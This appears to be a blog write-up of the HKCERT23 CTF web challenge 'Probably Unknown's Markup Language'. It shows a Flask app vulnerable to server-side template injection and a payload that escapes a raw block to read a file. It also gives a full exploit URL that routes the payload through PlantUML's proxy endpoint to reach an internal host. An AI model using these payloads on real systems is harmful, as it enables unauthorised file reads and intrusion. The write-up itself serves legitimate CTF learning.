---
author: Li Yan
pubDatetime: 2023-11-18T08:51:00Z
title: "HKCERT23: Probably Unknown's Markup Language"
postSlug: writeups-for-hkcert23-puml
featured: false
draft: false
tags:
  - ctf
  - ctf-web
  - writeups
  - hkcert
  - hkcert23
description: We all know that CS majors must know a long list of markup languages like HTML, XML, etc... How about IS majors? UML?
---

## Problem Content

We all know that CS majors must know a long list of markup languages like HTML, XML, etc...
How about IS majors? UML? Is UML even a markup language?

## Solution

First, take a quick view of `/docker-compose.yml`.

```yaml
services:
  plantuml:
    build: plantuml-server
    ports:
      - 8001:8080
    restart: unless-stopped
  puml.local:
    build: web
    restart: unless-stopped
```

It shows that the web service contains the flag can't be directly reached by user, but can be reached by the plantuml server on `puml.local:80`.

Consider the [PlantUML Documentation](https://plantuml.com/server) shows PlantUML server provides an API endpoint for a proxy service. 

In the service, PlantUML will visit the URL provided by the user, parse the PlantUML code such as `@startuml\n ... \n@enduml` in the response, and generate the Graph using the code.

Then look at `/web/server.py`.

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)
@app.route("/")
def index():
	return render_template_string("""{%% raw %%}

...

<body>
<div>
    <h1>PUML Demo</h1>
    <p><textarea>%(puml)s</textarea></p>
    <p><a href="https://plantuml.com/">More information...</a></p>

...

{%% endraw %%}""" % {"puml":request.args.get("puml")})

if __name__ == "__main__":
	app.run(host="0.0.0.0", port=80)
```

The server get an argument `puml` and directly put it to the page template, so we can use SSTI attack.

Though `{% raw %}` is used to prevent SSTI attack, we can simply bypass it.

Now the argument `puml` should be:

```python
{% endraw %}
@startuml
a:{{''.__class__.__mro__[1].__subclasses__()[100].__init__.__globals__.__builtins__['open']('/proof.sh').read()}}
@enduml
{% raw %}
```

Now we get the payload.

```
http://chal.hkcert23.pwnable.hk:28104/proxy?fmt=svg&src=http://puml.local/?puml=%250A%7B%2525%2520endraw%2520%2525%7D%250A@startuml%250Aa:%7B%7B%2527%2527.__class__.__mro__%5B1%5D.__subclasses__()[100].__init__.__globals__.__builtins__[%27open%27](%27/proof.sh%27).read()%7D%7D%250A@enduml%250A%7B%2525%2520raw%2520%2525%7D%250A
```

Visit the URL, and there is a flag given.

![flag](https://s2.loli.net/2023/11/18/qT2VJXFQkv5nOGB.png)